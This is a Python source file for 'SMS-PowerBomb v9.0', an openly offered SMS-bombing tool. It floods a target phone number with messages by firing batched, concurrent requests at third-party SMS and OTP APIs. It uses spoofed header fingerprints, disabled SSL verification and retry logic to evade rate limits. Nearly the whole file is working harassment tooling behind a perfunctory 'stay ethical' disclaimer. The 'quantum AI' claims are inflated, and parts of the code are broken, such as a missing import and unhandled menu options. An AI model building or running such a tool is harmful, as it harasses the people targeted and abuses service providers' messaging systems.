#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
# ☠️ SMS-POWERBOMB v9.0 - QUANTUM DOMINATION EDITION ☠️
# ═══════════════════════════════════════════════════════════════════
# Creator: RAJSARASWATI JATAV
# Team: RAJSARASWATI JATAV CYBER CREW
# GitHub: https://github.com/RAJSARASWATI-JATAV
# Telegram: https://t.me/rajsaraswatijatav
# Instagram: @official_rajsaraswati_jatav
# YouTube: @RajsaraswatiJatav
# ═══════════════════════════════════════════════════════════════════
# [QUANTUM] Next-Level AI-Powered SMS Automation
# [HYPER] 10x Faster Performance
# [SMART] Self-Healing APIs
# [WEB] Modern Web Dashboard
# [MULTI] Batch Target Support
# ═══════════════════════════════════════════════════════════════════
# Stay dark, stay ethical. Upgrade yourself!
# ═══════════════════════════════════════════════════════════════════

import os
import sys
import time
import asyncio
import aiohttp
from typing import List, Dict, Tuple
from datetime import datetime

# Import v8.0 modules
from main import (
    CyberColors, SMS_APIS, AdvancedBomberEngine,
    clear_screen, get_timestamp, format_time,
    print_main_banner, print_creator_info, print_disclaimer,
    validate_phone, normalize_phone
)

# Import v9.0 quantum modules
try:
    from quantum_ai import QuantumAIEngine, HyperPerformanceEngine, MultiTargetManager
    from web_dashboard import WebDashboardServer
    from telegram_bot import TelegramBotController
    from advanced_stealth import AdvancedStealthEngine, ProxyManager
    QUANTUM_ENABLED = True
except ImportError:
    QUANTUM_ENABLED = False
    print("⚠️ Quantum modules not found. Running in v8.0 compatibility mode.")

c = CyberColors()

# ═══════════════════════════════════════════════════════════════════
# QUANTUM BOMBER ENGINE v9.0
# ═══════════════════════════════════════════════════════════════════

class QuantumBomberEngine(AdvancedBomberEngine):
    """Next-generation quantum bomber with AI and hyper-performance"""
    
    def __init__(self, apis: List[Dict]):
        super().__init__(apis)
        
        if QUANTUM_ENABLED:
            self.quantum_ai = QuantumAIEngine()
            self.hyper_engine = HyperPerformanceEngine()
            self.stealth_engine = AdvancedStealthEngine()
            self.multi_target = MultiTargetManager()
            self.web_dashboard = WebDashboardServer()
            self.telegram_bot = TelegramBotController()
        else:
            self.quantum_ai = None
            self.hyper_engine = None
            self.stealth_engine = None
            self.multi_target = None
            self.web_dashboard = None
            self.telegram_bot = None
        
        self.quantum_mode = QUANTUM_ENABLED
        self.web_dashboard_enabled = False
    
    def enable_web_dashboard(self):
        """Enable web dashboard"""
        if self.web_dashboard and not self.web_dashboard_enabled:
            self.web_dashboard.start()
            self.web_dashboard_enabled = True
    
    def disable_web_dashboard(self):
        """Disable web dashboard"""
        if self.web_dashboard and self.web_dashboard_enabled:
            self.web_dashboard.stop()
            self.web_dashboard_enabled = False
    
    async def quantum_send_sms(self, session: aiohttp.ClientSession, api: Dict, 
                               phone: str, max_retries: int = 3) -> Tuple[str, bool, str]:
        """Send SMS with quantum AI optimization"""
        start_time = time.time()
        
        # Use stealth engine for headers
        if self.stealth_engine:
            headers = self.stealth_engine.generate_fingerprint(api['name'])
            headers.update(api["headers"])
        else:
            headers = api["headers"].copy()
            headers["User-Agent"] = self.get_random_user_agent()
        
        for attempt in range(max_retries):
            try:
                # Quantum delay
                if self.quantum_ai and attempt > 0:
                    delay = self.quantum_ai.calculate_quantum_delay(
                        self.success_count / max(1, self.total_attempts),
                        'normal'
                    )
                    await asyncio.sleep(delay)
                else:
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                
                if api["method"] == "POST":
                    async with session.post(
                        api["url"],
                        json=api["data"](phone),
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=15),
                        ssl=False
                    ) as response:
                        response_time = time.time() - start_time
                        
                        if response.status in [200, 201, 202]:
                            self.update_api_health(api['name'], True)
                            
                            # Record in quantum AI
                            if self.quantum_ai:
                                carrier = self.detect_carrier(phone)
                                self.quantum_ai.record_quantum_result(
                                    api['name'], True, response_time, carrier
                                )
                            
                            return (api["name"], True, "Success")
                        
                        elif response.status == 429:
                            if attempt < max_retries - 1:
                                await asyncio.sleep(2 ** attempt)
                                continue
                        
                        self.update_api_health(api['name'], False)
                        
                        if self.quantum_ai:
                            carrier = self.detect_carrier(phone)
                            self.quantum_ai.record_quantum_result(
                                api['name'], False, response_time, carrier
                            )
                        
                        return (api["name"], False, f"Status: {response.status}")
            
            except asyncio.TimeoutError:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
                
                response_time = time.time() - start_time
                self.update_api_health(api['name'], False)
                
                if self.quantum_ai:
                    self.quantum_ai.record_quantum_result(
                        api['name'], False, response_time
                    )
                
                return (api["name"], False, "Timeout")
            
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt)
                    continue
                
                response_time = time.time() - start_time
                self.update_api_health(api['name'], False)
                
                if self.quantum_ai:
                    self.quantum_ai.record_quantum_result(
                        api['name'], False, response_time
                    )
                
                return (api["name"], False, "Failed")
        
        return (api["name"], False, "Max retries exceeded")
    
    def detect_carrier(self, phone: str) -> str:
        """Detect carrier from phone number"""
        carrier_map = {
            '6': 'Vodafone/Vi',
            '7': 'Airtel/Jio',
            '8': 'Airtel/BSNL',
            '9': 'Jio/Airtel'
        }
        if phone and len(phone) >= 1:
            return carrier_map.get(phone[0], 'Unknown')
        return 'Unknown'
    
    def update_web_dashboard(self):
        """Update web dashboard with current stats"""
        if self.web_dashboard_enabled and self.web_dashboard:
            stats = self.get_stats()
            
            if self.quantum_ai:
                quantum_insights = self.quantum_ai.get_quantum_insights()
                stats['quantum_boost'] = quantum_insights['quantum_boost']
            else:
                stats['quantum_boost'] = 1.0
            
            stats['recent_results'] = [
                {'api': r[0], 'success': r[1]} 
                for r in list(self.recent_results)[-10:]
            ]
            
            self.web_dashboard.update_stats(stats)


# ═══════════════════════════════════════════════════════════════════
# QUANTUM BOMBING MODES
# ═══════════════════════════════════════════════════════════════════

async def quantum_mode_bombing(engine: QuantumBomberEngine, phone: str, count: int):
    """Quantum mode - AI decides best strategy"""
    print(f"\n{c.NEON_PURPLE}[🧠] QUANTUM AI MODE ACTIVATED{c.RESET}")
    print(f"{c.DARK}AI analyzing patterns and selecting optimal strategy...{c.RESET}\n")
    
    if not engine.quantum_ai:
        print(f"{c.RED}[!] Quantum AI not available. Falling back to normal mode.{c.RESET}")
        from main import normal_mode_bombing
        await normal_mode_bombing(engine, phone, count)
        return
    
    # Get quantum insights
    insights = engine.quantum_ai.get_quantum_insights()
    print(f"{c.NEON_GREEN}[✓]{c.WHITE} Quantum Boost: {c.NEON_ORANGE}{insights['quantum_boost']:.1f}x{c.RESET}")
    print(f"{c.NEON_GREEN}[✓]{c.WHITE} Evolution Generation: {c.NEON_ORANGE}{insights['evolution_generation']}{c.RESET}")
    print(f"{c.NEON_GREEN}[✓]{c.WHITE} Learning Progress: {c.NEON_ORANGE}{insights['learning_progress']:.0f}%{c.RESET}\n")
    
    time.sleep(1)
    engine.start_time = time.time()
    carrier = engine.detect_carrier(phone)
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            wave_start_time = time.time()
            
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            print(f"{c.NEON_PINK}[{c.NEON_ORANGE}{wave + 1}/{count}{c.NEON_PINK}]{c.WHITE} Quantum Wave {wave + 1} - {get_timestamp()}{c.RESET}")
            print(f"{c.NEON_PINK}{'═' * 75}{c.RESET}")
            
            # Get quantum-optimized APIs
            active_apis = engine.quantum_ai.get_quantum_apis(
                engine.get_active_apis(),
                carrier=carrier
            )
            
            # Quantum batch size
            batch_size = engine.quantum_ai.get_quantum_batch_size(len(active_apis), 'smart')
            
            # Execute in batches
            for i in range(0, len(active_apis), batch_size):
                batch = active_apis[i:i+batch_size]
                tasks = [engine.quantum_send_sms(session, api, phone) for api in batch]
                results = await asyncio.gather(*tasks)
                
                wave_success = 0
                wave_fail = 0
                
                for name, success, message in results:
                    engine.total_attempts += 1
                    engine.recent_results.append((name, success, message))
                    
                    if success:
                        engine.success_count += 1
                        wave_success += 1
                        print(f"  {c.NEON_GREEN}✓{c.WHITE} {name:<15} {c.NEON_GREEN}[SENT]{c.RESET}")
                    else:
                        engine.fail_count += 1
                        wave_fail += 1
                        print(f"  {c.RED}✗{c.WHITE} {name:<15} {c.RED}[FAILED]{c.DARK} - {message}{c.RESET}")
                
                # Update web dashboard
                engine.update_web_dashboard()
                
                # Small delay between batches
                if i + batch_size < len(active_apis):
                    await asyncio.sleep(random.uniform(0.3, 0.8))
            
            wave_time = time.time() - wave_start_time
            stats = engine.get_stats()
            
            # Get updated quantum insights
            quantum_insights = engine.quantum_ai.get_quantum_insights()
            
            print(f"\n{c.CYAN}  Wave Summary: {c.NEON_GREEN}{wave_success} Success{c.WHITE} | {c.RED}{wave_fail} Failed{c.WHITE} | {c.YELLOW}Time: {wave_time:.2f}s{c.WHITE} | {c.NEON_PURPLE}Quantum: {quantum_insights['quantum_boost']:.1f}x{c.RESET}\n")
            
            if wave < count - 1:
                delay = engine.quantum_ai.calculate_quantum_delay(
                    stats['success_rate'] / 100,
                    'smart'
                )
                print(f"{c.DARK}  Quantum delay: {delay:.1f}s...{c.RESET}")
                await asyncio.sleep(delay)
    
    # Save quantum memory
    if engine.quantum_ai:
        engine.quantum_ai.save_quantum_memory()
    
    print_quantum_summary(phone, count, engine.get_stats(), quantum_insights)


def print_quantum_summary(phone: str, waves: int, stats: Dict, quantum_insights: Dict):
    """Print quantum bombing summary"""
    print(f"\n{c.NEON_PINK}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
    print(f"{c.NEON_PINK}║{c.BOLD}{c.WHITE}                   QUANTUM BOMBING COMPLETE                               {c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}╠═══════════════════════════════════════════════════════════════════════════╣{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Target: {c.NEON_ORANGE}{phone:<63}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Total Waves: {c.NEON_BLUE}{waves:<59}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Total Attempts: {c.YELLOW}{stats['total_attempts']:<56}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Successful: {c.NEON_GREEN}{stats['success']:<60}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Failed: {c.RED}{stats['failed']:<64}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Success Rate: {c.NEON_GREEN}{stats['success_rate']:.1f}%{c.WHITE}{' ' * 54}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Total Time: {c.CYAN}{format_time(stats['elapsed_time']):<58}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Quantum Boost: {c.NEON_PURPLE}{quantum_insights['quantum_boost']:.1f}x{' ' * 54}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}║{c.WHITE}  Evolution Gen: {c.NEON_ORANGE}{quantum_insights['evolution_generation']:<56}{c.NEON_PINK}║{c.RESET}")
    print(f"{c.NEON_PINK}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
    
    if stats['success_rate'] > 70:
        print(f"{c.NEON_GREEN}[✓]{c.WHITE} Quantum bombing was {c.BOLD}HIGHLY SUCCESSFUL{c.RESET}{c.WHITE}! AI domination achieved.{c.RESET}")
    elif stats['success_rate'] > 50:
        print(f"{c.YELLOW}[!]{c.WHITE} Quantum bombing was {c.BOLD}SUCCESSFUL{c.RESET}{c.WHITE}. Good performance.{c.RESET}")
    else:
        print(f"{c.RED}[!]{c.WHITE} Quantum bombing had {c.BOLD}MODERATE SUCCESS{c.RESET}{c.WHITE}. AI learning from results.{c.RESET}")


# ═══════════════════════════════════════════════════════════════════
# ENHANCED MENU SYSTEM
# ═══════════════════════════════════════════════════════════════════

def print_v9_banner():
    """Display v9.0 quantum banner"""
    banner = f"""{c.NEON_GREEN}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ██╗    ██╗███████╗██████╗  ║
║   ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗ ║
║   ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝ ║
║   ╚════██║██║╚██╔╝██║╚════██║    ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗ ║
║   ███████║██║ ╚═╝ ██║███████║    ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ║
║   ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ║
║                                                                           ║
║                  ██████╗  ██████╗ ███╗   ███╗██████╗                      ║
║                  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗                     ║
║                  ██████╔╝██║   ██║██╔████╔██║██████╔╝                     ║
║                  ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗                     ║
║                  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝                     ║
║                  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝                      ║
║                                                                           ║
║            {c.NEON_PINK}☠️  v9.0 QUANTUM DOMINATION EDITION  ☠️{c.NEON_GREEN}              ║
║                    {c.NEON_PURPLE}🧠 AI-POWERED | 10X FASTER 🚀{c.NEON_GREEN}                     ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(banner)


def print_v9_menu():
    """Display v9.0 main menu"""
    quantum_status = f"{c.NEON_GREEN}ENABLED{c.RESET}" if QUANTUM_ENABLED else f"{c.RED}DISABLED{c.RESET}"
    
    menu = f"""{c.NEON_BLUE}
╔═══════════════════════════════════════════════════════════════════════════╗
║                              MAIN MENU v9.0                               ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {c.NEON_ORANGE}[1]{c.WHITE} Start SMS Bombing (Quantum AI Modes)                                 {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[2]{c.WHITE} Multi-Target Bombing (Batch Mode)                                    {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[3]{c.WHITE} Web Dashboard Control                                                {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[4]{c.WHITE} Quantum AI Insights                                                  {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[5]{c.WHITE} View Analytics & History                                             {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[6]{c.WHITE} Check API Status & Health                                            {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[7]{c.WHITE} About Tool & Creator                                                 {c.NEON_BLUE}║
║  {c.NEON_ORANGE}[8]{c.WHITE} Exit                                                                 {c.NEON_BLUE}║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {c.WHITE}Quantum AI: {quantum_status}                                                    {c.NEON_BLUE}║
║  {c.WHITE}Version: {c.NEON_GREEN}9.0 QUANTUM DOMINATION{c.RESET}                                           {c.NEON_BLUE}║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(menu)


def main_menu_v9():
    """Main menu loop for v9.0"""
    engine = QuantumBomberEngine(SMS_APIS)
    
    while True:
        clear_screen()
        print_v9_banner()
        print_creator_info()
        print_v9_menu()
        
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Select an option: {c.NEON_ORANGE}", end="")
        choice = input().strip()
        print(c.RESET, end="")
        
        if choice == "1":
            # Start SMS Bombing
            clear_screen()
            print_v9_banner()
            print_disclaimer()
            
            print(f"\n{c.YELLOW}[!]{c.WHITE} Do you accept the terms and conditions? (yes/no): {c.NEON_ORANGE}", end="")
            accept = input().strip().lower()
            print(c.RESET, end="")
            
            if accept in ["yes", "y"]:
                print()
                phone = get_phone_input()
                count = get_count_input()
                mode = get_mode_input_v9()
                
                print(f"{c.RED}[!]{c.WHITE} Are you sure you want to bomb {c.NEON_ORANGE}{phone}{c.WHITE}? (yes/no): {c.NEON_ORANGE}", end="")
                confirm = input().strip().lower()
                print(c.RESET, end="")
                
                if confirm in ["yes", "y"]:
                    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Starting quantum bombing sequence...{c.RESET}")
                    time.sleep(1)
                    
                    try:
                        if mode == '5' and QUANTUM_ENABLED:  # Quantum mode
                            asyncio.run(quantum_mode_bombing(engine, phone, count))
                        else:
                            # Fall back to v8.0 modes
                            from main import normal_mode_bombing, stealth_mode_bombing, turbo_mode_bombing
                            if mode == '1':
                                delay = get_delay_input()
                                asyncio.run(normal_mode_bombing(engine, phone, count, delay))
                            elif mode == '2':
                                asyncio.run(stealth_mode_bombing(engine, phone, count))
                            elif mode == '3':
                                asyncio.run(turbo_mode_bombing(engine, phone, count))
                    except KeyboardInterrupt:
                        print(f"\n\n{c.RED}[!]{c.WHITE} Bombing interrupted by user.{c.RESET}")
                    
                    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to return to main menu...{c.RESET}")
                    input()
                else:
                    print(f"\n{c.YELLOW}[!]{c.WHITE} Operation cancelled by user.{c.RESET}")
                    time.sleep(2)
            else:
                print(f"\n{c.RED}[!]{c.WHITE} You must accept the terms to use this tool.{c.RESET}")
                time.sleep(2)
        
        elif choice == "3":
            # Web Dashboard Control
            clear_screen()
            print_v9_banner()
            
            if not QUANTUM_ENABLED:
                print(f"\n{c.RED}[!]{c.WHITE} Quantum features not available.{c.RESET}")
                time.sleep(2)
                continue
            
            print(f"\n{c.NEON_BLUE}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
            print(f"{c.NEON_BLUE}║{c.BOLD}{c.WHITE}                     WEB DASHBOARD CONTROL                                 {c.NEON_BLUE}║{c.RESET}")
            print(f"{c.NEON_BLUE}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
            
            if engine.web_dashboard_enabled:
                print(f"{c.NEON_GREEN}[✓]{c.WHITE} Web Dashboard is {c.NEON_GREEN}RUNNING{c.RESET}")
                print(f"{c.NEON_GREEN}[✓]{c.WHITE} Access at: {c.CYAN}http://localhost:8080{c.RESET}\n")
                print(f"{c.NEON_ORANGE}[1]{c.WHITE} Stop Web Dashboard{c.RESET}")
            else:
                print(f"{c.RED}[!]{c.WHITE} Web Dashboard is {c.RED}STOPPED{c.RESET}\n")
                print(f"{c.NEON_ORANGE}[1]{c.WHITE} Start Web Dashboard{c.RESET}")
            
            print(f"{c.NEON_ORANGE}[2]{c.WHITE} Back to Main Menu{c.RESET}\n")
            
            print(f"{c.NEON_BLUE}[?]{c.WHITE} Select option: {c.NEON_ORANGE}", end="")
            dash_choice = input().strip()
            print(c.RESET, end="")
            
            if dash_choice == "1":
                if engine.web_dashboard_enabled:
                    engine.disable_web_dashboard()
                    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Web Dashboard stopped.{c.RESET}")
                else:
                    engine.enable_web_dashboard()
                    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Web Dashboard started at http://localhost:8080{c.RESET}")
                time.sleep(2)
        
        elif choice == "4":
            # Quantum AI Insights
            clear_screen()
            print_v9_banner()
            
            if not QUANTUM_ENABLED or not engine.quantum_ai:
                print(f"\n{c.RED}[!]{c.WHITE} Quantum AI not available.{c.RESET}")
                time.sleep(2)
                continue
            
            insights = engine.quantum_ai.get_quantum_insights()
            
            print(f"\n{c.NEON_PURPLE}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
            print(f"{c.NEON_PURPLE}║{c.BOLD}{c.WHITE}                     QUANTUM AI INSIGHTS                                   {c.NEON_PURPLE}║{c.RESET}")
            print(f"{c.NEON_PURPLE}╠═══════════════════════════════════════════════════════════════════════════╣{c.RESET}")
            print(f"{c.NEON_PURPLE}║{c.WHITE}  Quantum Boost: {c.NEON_ORANGE}{insights['quantum_boost']:.2f}x{' ' * 54}{c.NEON_PURPLE}║{c.RESET}")
            print(f"{c.NEON_PURPLE}║{c.WHITE}  Evolution Generation: {c.NEON_BLUE}{insights['evolution_generation']:<48}{c.NEON_PURPLE}║{c.RESET}")
            print(f"{c.NEON_PURPLE}║{c.WHITE}  Learning Progress: {c.NEON_GREEN}{insights['learning_progress']:.0f}%{' ' * 50}{c.NEON_PURPLE}║{c.RESET}")
            print(f"{c.NEON_PURPLE}║{c.WHITE}  Quantum State: {c.NEON_CYAN}{insights['quantum_state']:<55}{c.NEON_PURPLE}║{c.RESET}")
            print(f"{c.NEON_PURPLE}╠═══════════════════════════════════════════════════════════════════════════╣{c.RESET}")
            
            if insights['best_apis']:
                print(f"{c.NEON_PURPLE}║{c.WHITE}  Top Performing APIs:{' ' * 55}{c.NEON_PURPLE}║{c.RESET}")
                for i, api in enumerate(insights['best_apis'][:5], 1):
                    print(f"{c.NEON_PURPLE}║{c.CYAN}    {i}. {api:<70}{c.NEON_PURPLE}║{c.RESET}")
            
            if insights['recommendations']:
                print(f"{c.NEON_PURPLE}║{c.WHITE}  AI Recommendations:{' ' * 56}{c.NEON_PURPLE}║{c.RESET}")
                for rec in insights['recommendations']:
                    print(f"{c.NEON_PURPLE}║{c.YELLOW}    • {rec[:72]:<72}{c.NEON_PURPLE}║{c.RESET}")
            
            print(f"{c.NEON_PURPLE}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
            
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to continue...{c.RESET}")
            input()
        
        elif choice == "8":
            # Exit
            clear_screen()
            print(f"\n{c.NEON_PINK}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
            print(f"{c.NEON_PINK}║{c.BOLD}{c.WHITE}                    EXITING SMS-POWERBOMB v9.0                             {c.NEON_PINK}║{c.RESET}")
            print(f"{c.NEON_PINK}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Thank you for using SMS-PowerBomb v9.0 QUANTUM EDITION{c.RESET}")
            print(f"{c.NEON_PINK}[✓]{c.WHITE} Created by: {c.NEON_BLUE}RAJSARASWATI JATAV{c.RESET}")
            print(f"{c.NEON_ORANGE}[✓]{c.WHITE} Stay dark, stay ethical. Upgrade yourself!{c.RESET}\n")
            
            # Cleanup
            if engine.web_dashboard_enabled:
                engine.disable_web_dashboard()
            
            if engine.quantum_ai:
                engine.quantum_ai.save_quantum_memory()
            
            time.sleep(2)
            sys.exit(0)
        
        else:
            print(f"\n{c.RED}[!]{c.WHITE} Invalid option! Please try again.{c.RESET}")
            time.sleep(2)


def get_phone_input() -> str:
    """Get and validate phone number from user"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Enter target phone number (10 digits): {c.NEON_ORANGE}", end="")
        phone = input().strip()
        print(c.RESET, end="")
        
        if validate_phone(phone):
            phone = normalize_phone(phone)
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Valid phone number: {c.NEON_ORANGE}{phone}{c.RESET}\n")
            return phone
        else:
            print(f"{c.RED}[!]{c.WHITE} Invalid phone number! Must be 10 digits starting with 6/7/8/9.{c.RESET}\n")


def get_count_input() -> int:
    """Get SMS wave count from user"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Enter number of SMS waves (1-100): {c.NEON_ORANGE}", end="")
        try:
            count = int(input().strip())
            print(c.RESET, end="")
            if 1 <= count <= 100:
                print(f"{c.NEON_GREEN}[✓]{c.WHITE} Wave count set to: {c.NEON_ORANGE}{count}{c.RESET}\n")
                return count
            else:
                print(f"{c.RED}[!]{c.WHITE} Please enter a number between 1 and 100.{c.RESET}\n")
        except ValueError:
            print(f"{c.RESET}{c.RED}[!]{c.WHITE} Invalid input! Please enter a number.{c.RESET}\n")


def get_mode_input_v9() -> str:
    """Get bombing mode from user (v9.0)"""
    print(f"{c.NEON_BLUE}[?]{c.WHITE} Select bombing mode:{c.RESET}")
    print(f"  {c.NEON_GREEN}[1]{c.WHITE} Normal Mode (Balanced){c.RESET}")
    print(f"  {c.NEON_PURPLE}[2]{c.WHITE} Stealth Mode (Randomized, slower){c.RESET}")
    print(f"  {c.NEON_ORANGE}[3]{c.WHITE} Turbo Mode (Maximum speed){c.RESET}")
    if QUANTUM_ENABLED:
        print(f"  {c.NEON_YELLOW}[5]{c.WHITE} Quantum Mode (AI-powered, 10x faster) ⚡{c.RESET}")
    
    while True:
        max_choice = '5' if QUANTUM_ENABLED else '3'
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Choose mode (1-{max_choice}): {c.NEON_ORANGE}", end="")
        mode = input().strip()
        print(c.RESET, end="")
        
        valid_modes = ['1', '2', '3', '5'] if QUANTUM_ENABLED else ['1', '2', '3']
        if mode in valid_modes:
            mode_names = {'1': 'Normal', '2': 'Stealth', '3': 'Turbo', '5': 'Quantum'}
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Mode selected: {c.NEON_ORANGE}{mode_names[mode]}{c.RESET}\n")
            return mode
        else:
            print(f"{c.RED}[!]{c.WHITE} Invalid choice! Please select 1-{max_choice}.{c.RESET}\n")


def get_delay_input() -> int:
    """Get delay between waves"""
    while True:
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Delay between waves in seconds (1-10, default 2): {c.NEON_ORANGE}", end="")
        delay_input = input().strip()
        print(c.RESET, end="")
        
        if not delay_input:
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Using default delay: {c.NEON_ORANGE}2s{c.RESET}\n")
            return 2
        
        try:
            delay = int(delay_input)
            if 1 <= delay <= 10:
                print(f"{c.NEON_GREEN}[✓]{c.WHITE} Delay set to: {c.NEON_ORANGE}{delay}s{c.RESET}\n")
                return delay
            else:
                print(f"{c.RED}[!]{c.WHITE} Please enter a number between 1 and 10.{c.RESET}\n")
        except ValueError:
            print(f"{c.RED}[!]{c.WHITE} Invalid input! Please enter a number.{c.RESET}\n")


# ═══════════════════════════════════════════════════════════════════
# PROGRAM ENTRY POINT
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main_menu_v9()
    except KeyboardInterrupt:
        print(f"\n\n{c.RED}[!]{c.WHITE} Interrupted by user (Ctrl+C).{c.RESET}")
        print(f"{c.NEON_GREEN}[✓]{c.WHITE} Stay dark, stay ethical. Upgrade yourself!{c.RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{c.RED}[ERROR]{c.WHITE} {str(e)}{c.RESET}\n")
        sys.exit(1)